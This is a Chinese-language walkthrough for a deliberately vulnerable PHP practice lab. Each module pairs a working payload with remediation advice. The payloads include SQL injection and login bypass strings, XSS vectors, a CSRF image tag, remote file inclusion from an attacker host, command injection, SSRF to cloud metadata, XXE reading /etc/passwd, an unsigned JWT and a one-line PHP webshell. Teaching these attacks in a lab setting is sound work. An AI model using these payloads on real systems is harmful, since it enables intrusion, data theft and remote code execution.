# PHP-Code-Sec 通关教程（Writeup）

> 仅用于安全学习。所有示例均为演示漏洞，切勿在生产环境或未经授权环境使用。

## 前置说明
- 默认数据库用户 `admin/admin123`（MD5 存储），`guest/guest`。
- 安装完成后访问首页，逐个模块练习。

## 目录
- SQL 注入
- XSS（反射型/存储型/DOM）
- CSRF（邮箱修改）
- 文件上传绕过
- 文件包含（LFI/RFI）
- 路径遍历
- 命令注入
- SSRF
- 不安全反序列化
- PHAR 对象注入
- 开放重定向
- 邮件头注入
- 弱加密与弱随机
- 权限逻辑漏洞
- 会话固定
- 变量覆盖（extract）
- XPath 注入
- 正则 ReDoS
- PHP 流包装器信息泄露
- LDAP 注入
- Web 缓存投毒与欺骗
- 二次解析（双重解码）

---

## SQL 注入（modules/sqli/index.php）
- 数字型：`id=1 OR 1=1` 可返回所有用户信息。
- 字符型：`q=admin' OR '1'='1` 绕过用户名精确匹配。
- 登录绕过（login.php）：用户名 `admin`，密码 `"' OR '1'='1"`，拼接语句命中。
- 修复要点：使用预编译（PDO prepare/bind）、最小权限账户、关闭错误回显、统一过滤输出。

## XSS（modules/xss/）
- 反射型：访问 `reflected.php?q=<script>alert(1)</script>` 即弹窗。
- 存储型：在 `stored.php` 留言处提交 `<img src=x onerror=alert(1)>`，再次加载列表触发。
- DOM 型：在 `dom.php#<svg onload=alert(1)>`，由 JS 将 hash 注入到 `innerHTML` 触发。
- 修复要点：输出时用 `htmlspecialchars`；对富文本采用白名单过滤；前端避免直接 `innerHTML`；开启 CSP。

## CSRF（modules/csrf/change_email.php）
- 登录后访问该页，通过 GET 参数即可改邮箱：`?email=attacker@evil.com`。
- 制作恶意页面嵌入 `<img src="http://target/modules/csrf/change_email.php?email=evil@evil.com">` 即可跨站触发。
- 修复要点：校验 CSRF Token、限制敏感操作为 POST、SameSite Cookie、双因子校验。

## 文件上传绕过（modules/upload/index.php）
- 仅检查扩展名，可用双扩展：`shell.php.jpg`。
- 若服务端解析误配或结合文件包含可进一步 RCE。
- 修复要点：强校验 MIME 与内容、随机文件名、存储到非可执行目录、图片库解码二次校验。

## 文件包含 LFI/RFI（modules/fi/index.php）
- LFI：使用 `page=../../data/notes.txt` 绕过路径，读取任意文件（演示目录内）。
- RFI：若 `allow_url_include=On` 可尝试 `page=http://yourhost/payload.txt`。
- 修复要点：严格白名单/映射、禁用远程包含、路径归一化与限制根目录。

## 路径遍历（modules/path/index.php）
- `file=../core/init.php` 可读取源码。
- 修复要点：限制目录、拒绝 `..`、仅允许固定文件名或ID。

## 命令注入（modules/command/index.php）
- Windows 示例：`host=127.0.0.1 & calc` 注入系统命令。
- 修复要点：使用安全API（如 ping 库或禁用系统调用）、严格白名单、转义与拆分参数。

## SSRF（modules/ssrf/index.php）
- 请求任意URL：`url=http://127.0.0.1/` 或云环境 `http://169.254.169.254/`（如可访问）。
- 修复要点：禁止访问内网/环回、协议白名单与域名白名单、超时与响应大小限制。

## 不安全反序列化（modules/unserialize/index.php）
- 构造：`O:4:"Evil":1:{s:3:"cmd";s:8:"calc.exe";}` 触发 `__destruct`。
- 修复要点：拒绝反序列化不可信数据，使用 JSON；如必须，启用允许类白名单、禁用危险魔术方法。

## PHAR 对象注入（modules/phar/index.php）
- 若代码对 `phar://` 路径使用 `getimagesize()` 等函数，PHAR 元数据内置对象可自动反序列化。
- 测试：准备含恶意对象元数据的 `evil.phar`，访问 `path=phar:///绝对路径/evil.phar/test.jpg`。
- 修复要点：拒绝处理不可信 phar、仅处理真实图片文件、禁用自动反序列化。

## 开放重定向（modules/redirect/index.php）
- `to=https://evil.com/` 直接跳转，易钓鱼。
- 修复要点：限制跳转到站内路径、加入签名或白名单校验。

## 邮件头注入（modules/mail/index.php）
- `from` 字段可注入 CRLF：`noreply@example.com\r\nBCC: attacker@evil.com`
- 修复要点：校验邮件头、拒绝控制字符、使用安全邮件库。

## 弱加密与弱随机（modules/crypto/index.php）
- 使用 `md5 + rand` 生成令牌，容易预测。
- 修复要点：使用 `random_bytes`/`openssl_random_pseudo_bytes` 等强随机，令牌长度足够。

## 权限逻辑漏洞（modules/auth/index.php）
- `?admin=1` 即显示敏感信息，完全依赖参数。
- 修复要点：后端基于会话角色校验，严禁信任前端参数。

## 会话固定（modules/session/demo_login.php & login.php）
- 登录后不 `session_regenerate_id(true)`，攻击者可预设会话。
- 修复要点：登录成功后立即 regenerate，设置 `HttpOnly` 与 `SameSite` Cookie。

## XXE（modules/xxe/index.php）
- 读取本地文件（Linux）：
```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```
- 读取 Windows 文件：`file:///C:/Windows/win.ini`
- 修复要点：禁用外部实体解析，使用 `LIBXML_NONET` 并关闭 DTD；改用安全解析器。

## RCE（modules/rce/eval.php）
- 演示：在文本框输入 `echo system('whoami');` 或 `phpinfo();` 即执行。
- 修复要点：绝不对不可信输入使用 `eval`/`assert`，采用白名单逻辑与安全 API。

## JWT 弱校验（modules/jwt/index.php）
- 构造 `alg=none` 的 JWT：头 `{"alg":"none","typ":"JWT"}`，载荷可设置 `{"user":"admin"}`，签名留空。
- 或伪造签名时仍被接受。
- 修复要点：强制指定算法并验证签名与密钥，拒绝 `none` 算法。

## IDOR 越权（modules/idor/user.php）
- 登录后访问 `?id=2` 即可读取他人信息。
- 修复要点：后端基于会话身份做所有权与权限校验（对象级访问控制）。

## CORS 误配置（modules/cors/index.php）
- 接口反射任意 `Origin` 并启用 `Allow-Credentials`，可在恶意站点跨域读取含敏感字段的响应。
- 修复要点：仅允许可信白名单域名，`Allow-Credentials=true` 时不得使用 `*`，避免反射来源。

## 参数污染 HPP（modules/hpp/index.php）
- 示例：`price=999&price=1` 覆盖价格；`role=user&role=admin` 提升角色。
- 修复要点：统一参数解析策略、拒绝重复同名参数、严格类型与边界校验。

## 任意文件写入（modules/write/index.php）
- 写入 WebShell：路径 `../../webshell.php`，内容 `<?php system($_GET['cmd']); ?>`，之后访问 `webshell.php?cmd=whoami`。
- 修复要点：限制写入目录到沙箱、固定文件名/扩展、校验内容与权限、最小化文件系统操作。

## phpinfo 泄露（modules/phpinfo/index.php）
- 暴露服务器版本、扩展、路径、环境变量等敏感信息。
- 修复要点：生产环境移除调试页面，必要时通过鉴权严格限制。

## Host Header 注入（modules/host/index.php）
- 构造的密码重置链接依赖 `HTTP_HOST`，可通过伪造 Host 头注入恶意域名并钓鱼。
- 修复要点：生成链接时使用配置的可信主域名，token 加签与有效期校验。

## 订单逻辑漏洞（modules/logic/order.php）
- 前端传入的价格可被任意篡改，后端未做校验。
- 修复要点：后端依据数据库商品价格与用户权益计算金额，拒绝前端价格参数。

## 点击劫持（modules/clickjack/target.php & modules/clickjack/evil.html）
- 目标页未设置 `X-Frame-Options` 或 CSP `frame-ancestors`，可被第三方页面以透明 iframe 覆盖按钮诱导点击。
- 演示：打开恶意页 `evil.html`，点击“立即领取”实际触发目标页敏感按钮。
- 修复要点：设置 `X-Frame-Options: DENY/SAMEORIGIN` 或 CSP `frame-ancestors 'none' / <可信域>`；对关键操作加入二次确认。

## 弱类型比较与魔法哈希（modules/typing/index.php）
- 使用 `==` 比较时，`"0e..."` 字符串被视作科学计数法的数字 0，导致与其它 `0e...` 比较相等；`md5('QNKCDZO')` 等“魔法哈希”可绕过。
- 演示：输入 token `0e999999999` 或密码 `QNKCDZO`，观察验证结果。
- 修复要点：使用 `===` 严格比较；对于哈希比较使用固定时长的常量时间比较；避免依赖弱哈希。

---

## 通关建议
- 每个模块先尝试基础 payload，再推演到更复杂情形（联合注入、二次注入、文件上传联动文件包含等）。
- 结合浏览器插件或 Burp Suite 等工具进行拦截与修改请求。

## 参考
- OWASP Cheat Sheet Series
- PHP 官方手册（安全相关章节）
- DVWA / Pikachu 项目结构与练习方式
## 变量覆盖（extract）（modules/override/index.php）
- 现象：通过 `extract($_GET)` 导入参数到当前作用域，`EXTR_OVERWRITE` 默认覆盖同名变量，导致后端关键变量（如 `is_admin`、`role`）被用户输入替换。
- 体验：访问 `?is_admin=1&role=admin`，观察权限从普通用户变为管理员。
- 修复要点：避免使用 `extract()`，使用白名单映射赋值；统一读取请求参数后做类型与范围校验；关键变量不可被外部覆盖。

## XPath 注入（modules/xpath/index.php）
- 现象：将输入直接拼接到 XPath 表达式（如 `//user[name='$q']`），可通过闭合与追加路径语法选择更敏感的节点或绕过条件。
- 体验：`q=alice'] | //user[role='admin`，使查询包含管理员节点，从而读取 `secret`。
- 修复要点：避免字符串拼接，采用参数化/安全 API；对输入做白名单（仅允许合法用户名字符集）；结果集二次按角色权限过滤。

## 正则 ReDoS（modules/redos/index.php）
- 现象：含嵌套量词与可回溯的模式在特定输入上产生灾难性回溯，CPU 占用飙升（拒绝服务）。
- 体验：模式 `^(a+)+$` 对输入 `aaaa...b`（一长串 `a` 后接 `b`）会显著耗时。
- 修复要点：避免嵌套量词；使用原子分组/占有量词降低回溯；限制输入长度与正则复杂度；加入执行超时与隔离策略。

## PHP 流包装器信息泄露（modules/wrapper/index.php）
- 现象：未限制路径或包装器前缀时，`php://filter/convert.base64-encode/resource=` 可读取并展示源码，泄露敏感逻辑与凭据。
- 体验：读取 `index.php` 或 `core/init.php` 源码，观察到配置信息与实现细节。
- 修复要点：路径白名单与扩展限制；拒绝 `php://`、`phar://`、`data://` 等包装器；关闭错误信息与目录索引。

## LDAP 注入（modules/ldap/index.php）
- 现象：输入直接拼接到 LDAP 过滤器，如 `(|(uid=$u)(mail=$u@example.com))`，通过特殊语法扩展检索范围，获取更敏感条目（如管理员）。
- 体验：`u=*)(|(role=admin))(`，模拟结果包含管理员记录。
- 修复要点：严格白名单输入，拒绝 `* ( ) | &` 等特殊符；使用参数化接口/统一转义；结果集再按权限过滤。

## Web 缓存投毒与欺骗（modules/cache/index.php）
- 现象：缓存键未包含影响响应的参数/头部（如 `promo`、`User-Agent`），导致动态内容被缓存并提供给其他用户（投毒）。
- 体验：对同一 `page` 写入不同 `promo`，观察同一缓存槽位被污染，其他用户看到恶意内容。
- 修复要点：将影响响应的参数/头纳入缓存键（`Vary`）；对动态页面禁用缓存或细粒度缓存；设置正确 `Content-Type` 与路由，避免静态化欺骗。

## 二次解析（双重解码）（modules/doubleparse/index.php）
- 现象：网关/服务器一次解码 + 应用层二次解码还原危险序列（如 `../`），绕过校验与路径限制，造成路径穿越读取。
- 体验：`file=..%252F..%252Fcore%252Finit.php` 经过两次解码变成 `../../core/init.php` 并被拼接读取。
- 修复要点：统一并仅一次解码；路径规范化（`realpath`）与前缀校验；白名单文件名/扩展与目录限制。
